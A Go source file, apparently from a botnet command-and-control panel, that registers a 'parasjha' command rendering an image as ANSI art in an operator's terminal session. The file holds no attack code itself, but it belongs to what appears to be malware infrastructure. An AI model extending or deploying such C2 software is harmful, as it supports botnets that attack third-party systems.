package commands

import (
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"cnc/pkg/renderer"
	"github.com/disintegration/imaging"
)

func init() {
	command.Create(&command.Command{
		Aliases:     []string{"parasjha"},
		Description: "Displays a paras jha.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			_ = session.Clear()

			a, _ := renderer.ImageFromPath("resources/paras.jpg",
				imaging.Lanczos,
				renderer.Width(session.Terminal.Width()),
				renderer.Height(session.Terminal.Height()-1),
				renderer.Writer(session.Channel),
				renderer.Type(renderer.TypeANSI),
			)

			_, _ = a.Write()
			return nil
		},
	})
}
